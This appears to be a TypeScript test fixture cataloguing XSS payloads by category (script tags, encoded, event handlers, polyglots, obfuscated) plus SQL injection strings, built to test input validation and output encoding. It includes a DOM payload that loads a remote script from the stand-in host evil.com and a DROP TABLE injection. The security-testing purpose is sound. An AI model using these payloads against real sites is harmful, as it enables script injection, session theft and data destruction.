/**
 * Comprehensive XSS Payload Catalog for Security Testing
 *
 * This module provides a curated collection of XSS attack vectors
 * organized by attack type to thoroughly test input validation and
 * output encoding across all application surfaces.
 */

// Basic XSS vectors - Standard script injection patterns
export const BASIC_XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  "<script>alert('XSS')</script>",
  '<script>alert(`XSS`)</script>',
  '<img src=x onerror=alert("XSS")>',
  "<img src=x onerror=alert('XSS')>",
  '<svg onload=alert("XSS")>',
  '<svg/onload=alert("XSS")>',
  '<body onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<object data="javascript:alert(\'XSS\')">',
]

// Encoded payloads - HTML/URL encoded attack vectors
export const ENCODED_XSS_PAYLOADS = [
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  '%3Cscript%3Ealert("XSS")%3C/script%3E',
  '%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E',
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',
  '&#x3C;script&#x3E;alert("XSS")&#x3C;/script&#x3E;',
  '&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;alert("XSS")&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;',
]

// JavaScript URI schemes - Protocol-based injection
export const JAVASCRIPT_URI_PAYLOADS = [
  'javascript:alert("XSS")',
  "javascript:alert('XSS')",
  'javascript:void(alert("XSS"))',
  'javascript:void(0);alert("XSS")',
  'data:text/html,<script>alert("XSS")</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
]

// Event handler payloads - Inline event injection
export const EVENT_HANDLER_PAYLOADS = [
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',
  '<textarea onfocus=alert("XSS") autofocus>',
  '<button onclick=alert("XSS")>Click</button>',
  '<div onmouseover=alert("XSS")>Hover</div>',
  '<img src=x onerror=alert("XSS")>',
  '<video><source onerror=alert("XSS")>',
  '<audio src=x onerror=alert("XSS")>',
]

// Polyglot payloads - Context-agnostic multi-vector attacks
export const POLYGLOT_PAYLOADS = [
  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert("XSS") )//%0D%0A%0d%0a//',
  '--><script>alert("XSS")</script><!--',
  '\'">' +
    '><marquee><img src=x onerror=confirm(1)></marquee>">' +
    '</plaintext\\></|\\><plaintext/onmouseover=prompt(1)>',
  '\'">><script>alert(String.fromCharCode(88,83,83))</script>',
]

// SQL injection attempts - Should not cause XSS but test cross-contamination
export const SQL_INJECTION_PAYLOADS = [
  "'; DROP TABLE users--",
  "1' OR '1'='1",
  "1' OR '1'='1' --",
  '<script>alert(String.fromCharCode(88,83,83))</script>',
  "' UNION SELECT NULL, NULL--",
]

// Special characters and edge cases
export const SPECIAL_CHAR_PAYLOADS = [
  '<>"\'`',
  '&lt;&gt;&quot;&#39;&#96;',
  '\0<script>alert("XSS")</script>',
  '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
  '<<SCRIPT>alert("XSS");//<</SCRIPT>',
]

// Attribute injection patterns
export const ATTRIBUTE_INJECTION_PAYLOADS = [
  '" onload="alert(\'XSS\')',
  "' onload='alert(\"XSS\")'",
  '"><script>alert("XSS")</script>',
  '\'><script>alert("XSS")</script>',
  '`><script>alert("XSS")</script>',
]

// DOM-based XSS vectors
export const DOM_XSS_PAYLOADS = [
  '#<script>alert("XSS")</script>',
  'javascript:eval(\'var a=document.createElement("script");a.src="http://evil.com/xss.js";document.body.appendChild(a)\')',
  '<img src=x:alert(alt) onerror=eval(src) alt=xss>',
]

// Obfuscation techniques
export const OBFUSCATED_PAYLOADS = [
  '<script>alert(String.fromCharCode(88,83,83))</script>',
  '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
  "<img src=x onerror=\\u0061\\u006c\\u0065\\u0072\\u0074('XSS')>",
  "<img src=x onerror=\\x61\\x6c\\x65\\x72\\x74('XSS')>",
]

/**
 * All XSS payloads combined for comprehensive testing
 */
export const ALL_XSS_PAYLOADS = [
  ...BASIC_XSS_PAYLOADS,
  ...ENCODED_XSS_PAYLOADS,
  ...JAVASCRIPT_URI_PAYLOADS,
  ...EVENT_HANDLER_PAYLOADS,
  ...POLYGLOT_PAYLOADS,
  ...SQL_INJECTION_PAYLOADS,
  ...SPECIAL_CHAR_PAYLOADS,
  ...ATTRIBUTE_INJECTION_PAYLOADS,
  ...DOM_XSS_PAYLOADS,
  ...OBFUSCATED_PAYLOADS,
]

/**
 * Subset of most critical payloads for quick smoke testing
 */
export const CRITICAL_XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  'javascript:alert("XSS")',
  '" onload="alert(\'XSS\')',
  '"><script>alert("XSS")</script>',
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
]

/**
 * Get payload category name for reporting
 */
export function getPayloadCategory(payload: string): string {
  if (BASIC_XSS_PAYLOADS.includes(payload)) return 'Basic XSS'
  if (ENCODED_XSS_PAYLOADS.includes(payload)) return 'Encoded XSS'
  if (JAVASCRIPT_URI_PAYLOADS.includes(payload)) return 'JavaScript URI'
  if (EVENT_HANDLER_PAYLOADS.includes(payload)) return 'Event Handler'
  if (POLYGLOT_PAYLOADS.includes(payload)) return 'Polyglot'
  if (SQL_INJECTION_PAYLOADS.includes(payload)) return 'SQL Injection'
  if (SPECIAL_CHAR_PAYLOADS.includes(payload)) return 'Special Characters'
  if (ATTRIBUTE_INJECTION_PAYLOADS.includes(payload)) return 'Attribute Injection'
  if (DOM_XSS_PAYLOADS.includes(payload)) return 'DOM-based XSS'
  if (OBFUSCATED_PAYLOADS.includes(payload)) return 'Obfuscated'
  return 'Unknown'
}
